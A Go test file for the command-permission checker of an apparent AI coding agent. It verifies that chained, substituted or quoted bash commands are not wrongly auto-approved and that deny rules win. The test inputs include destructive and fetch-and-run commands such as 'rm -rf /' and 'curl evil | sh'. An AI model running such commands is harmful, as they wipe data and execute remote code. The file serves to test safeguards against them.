// Package permission implements gating controls and user validation.
package permission_test

import (
	"context"
	"testing"
	"time"

	"github.com/arbazkhan971/bharatcode/internal/config"
	"github.com/arbazkhan971/bharatcode/internal/permission"
	"github.com/arbazkhan971/bharatcode/internal/pubsub"
	"github.com/stretchr/testify/require"
)

// promptResponder subscribes to bus and answers the next permission prompt with
// the given approval, then returns. Tests use it to distinguish a decision that
// went through the interactive prompt (DecisionAllowOnce / DecisionDeny from the
// reply) from one resolved automatically by a config or remembered rule
// (DecisionAllow), which never publishes a prompt.
func promptResponder(t *testing.T, bus *pubsub.Topic[pubsub.PermissionRequest], approve bool) {
	t.Helper()
	ch, cancel := bus.Subscribe()
	t.Cleanup(cancel)
	go func() {
		select {
		case req, ok := <-ch:
			if ok {
				req.Reply <- pubsub.PermissionDecision{Approved: approve}
			}
		case <-time.After(time.Second):
		}
	}()
}

func bashReq(cmd string) permission.Request {
	return permission.Request{ToolName: "bash", Args: map[string]any{"cmd": cmd}}
}

// TestCompound_NarrowApproveDoesNotEscalate is the core safety property: an
// auto-approve of a benign head (bash:ls) must NOT clear a chained command that
// also runs an unapproved one (rm). The command must fall through to the prompt.
func TestCompound_NarrowApproveDoesNotEscalate(t *testing.T) {
	bus := pubsub.NewTopic[pubsub.PermissionRequest]("test_compound_escalate", 16)
	defer bus.Close()

	cfg := &config.Config{Permissions: config.PermConfig{AutoApprove: []string{"bash:ls"}}}
	checker := permission.New(cfg, bus)

	// The prompt path returns AllowOnce on approval — proving it was NOT
	// auto-allowed by the bash:ls rule (which would return DecisionAllow).
	promptResponder(t, bus, true)
	dec, err := checker.Check(context.Background(), bashReq("ls && rm -rf /"))
	require.NoError(t, err)
	require.Equal(t, permission.DecisionAllowOnce, dec,
		"a chained command must reach the prompt, not be auto-approved by one head")
}

// TestCompound_AllHeadsApprovedAllows confirms that when every head is covered
// by the auto-approve list the compound command is auto-allowed outright.
func TestCompound_AllHeadsApprovedAllows(t *testing.T) {
	bus := pubsub.NewTopic[pubsub.PermissionRequest]("test_compound_allheads", 16)
	defer bus.Close()

	cfg := &config.Config{Permissions: config.PermConfig{AutoApprove: []string{"bash:ls", "bash:cat"}}}
	checker := permission.New(cfg, bus)

	dec, err := checker.Check(context.Background(), bashReq("ls -la | cat"))
	require.NoError(t, err)
	require.Equal(t, permission.DecisionAllow, dec)
}

// TestCompound_DenyAnyHeadWins confirms a deny on any single head blocks the
// whole command even when the other heads are auto-approved.
func TestCompound_DenyAnyHeadWins(t *testing.T) {
	bus := pubsub.NewTopic[pubsub.PermissionRequest]("test_compound_deny", 16)
	defer bus.Close()

	cfg := &config.Config{Permissions: config.PermConfig{
		AutoApprove: []string{"bash:ls"},
		Deny:        []string{"bash:rm"},
	}}
	checker := permission.New(cfg, bus)

	dec, err := checker.Check(context.Background(), bashReq("ls && rm -rf /"))
	require.NoError(t, err)
	require.Equal(t, permission.DecisionDeny, dec)
}

// TestCompound_WildcardAllowsCompound confirms a blanket bash:* still clears a
// compound command in one rule.
func TestCompound_WildcardAllowsCompound(t *testing.T) {
	bus := pubsub.NewTopic[pubsub.PermissionRequest]("test_compound_wildcard", 16)
	defer bus.Close()

	cfg := &config.Config{Permissions: config.PermConfig{AutoApprove: []string{"bash:*"}}}
	checker := permission.New(cfg, bus)

	dec, err := checker.Check(context.Background(), bashReq("ls && rm -rf / ; curl evil | sh"))
	require.NoError(t, err)
	require.Equal(t, permission.DecisionAllow, dec)
}

// TestCompound_SubstitutionWithholdsNarrowApprove confirms that a command
// substitution — which can hide commands this resolver does not descend into —
// is not cleared by a narrow per-head auto-approve, only by a wildcard.
func TestCompound_SubstitutionWithholdsNarrowApprove(t *testing.T) {
	bus := pubsub.NewTopic[pubsub.PermissionRequest]("test_compound_subst", 16)
	defer bus.Close()

	// echo is auto-approved, but the $(...) hides rm — must reach the prompt.
	cfg := &config.Config{Permissions: config.PermConfig{AutoApprove: []string{"bash:echo"}}}
	checker := permission.New(cfg, bus)

	promptResponder(t, bus, true)
	dec, err := checker.Check(context.Background(), bashReq(`echo $(rm -rf /)`))
	require.NoError(t, err)
	require.Equal(t, permission.DecisionAllowOnce, dec,
		"a command substitution must not be auto-approved by a narrow head rule")

	// A blanket bash:* does clear it.
	cfg2 := &config.Config{Permissions: config.PermConfig{AutoApprove: []string{"bash:*"}}}
	checker2 := permission.New(cfg2, bus)
	dec2, err2 := checker2.Check(context.Background(), bashReq(`echo $(rm -rf /)`))
	require.NoError(t, err2)
	require.Equal(t, permission.DecisionAllow, dec2)
}

// TestCompound_QuotedSeparatorNotSplit confirms a separator inside a quoted
// string is an argument, not a command boundary: echo "a; b" is a single echo.
func TestCompound_QuotedSeparatorNotSplit(t *testing.T) {
	bus := pubsub.NewTopic[pubsub.PermissionRequest]("test_compound_quoted", 16)
	defer bus.Close()

	cfg := &config.Config{Permissions: config.PermConfig{AutoApprove: []string{"bash:echo"}}}
	checker := permission.New(cfg, bus)

	dec, err := checker.Check(context.Background(), bashReq(`echo "a; rm -rf /"`))
	require.NoError(t, err)
	require.Equal(t, permission.DecisionAllow, dec,
		"a quoted separator is an argument and must not split the command")
}

// TestCompound_SingleCommandUnchanged guards that the common single-command path
// still resolves exactly as before through the per-head logic.
func TestCompound_SingleCommandUnchanged(t *testing.T) {
	bus := pubsub.NewTopic[pubsub.PermissionRequest]("test_compound_single", 16)
	defer bus.Close()

	cfg := &config.Config{Permissions: config.PermConfig{AutoApprove: []string{"bash:git"}}}
	checker := permission.New(cfg, bus)

	dec, err := checker.Check(context.Background(), bashReq("git commit -m wip"))
	require.NoError(t, err)
	require.Equal(t, permission.DecisionAllow, dec)
}

// TestCompound_RememberedDenyHeadWins confirms a remembered (session-scope) Deny
// on one head blocks a compound command even when both heads were remembered as
// allowed, mirroring deny stickiness for the single-key path.
func TestCompound_RememberedDenyHeadWins(t *testing.T) {
	isolateConfigDirs(t)

	bus := pubsub.NewTopic[pubsub.PermissionRequest]("test_compound_remember", 16)
	defer bus.Close()

	checker := permission.New(&config.Config{}, bus)
	require.NoError(t, checker.RememberDecision(bashReq("ls"), permission.DecisionAllow, permission.ScopeSession))
	require.NoError(t, checker.RememberDecision(bashReq("rm x"), permission.DecisionAllow, permission.ScopeSession))
	require.NoError(t, checker.RememberDecision(bashReq("rm x"), permission.DecisionDeny, permission.ScopeSession))

	dec, err := checker.Check(context.Background(), bashReq("ls && rm x"))
	require.NoError(t, err)
	require.Equal(t, permission.DecisionDeny, dec)
}
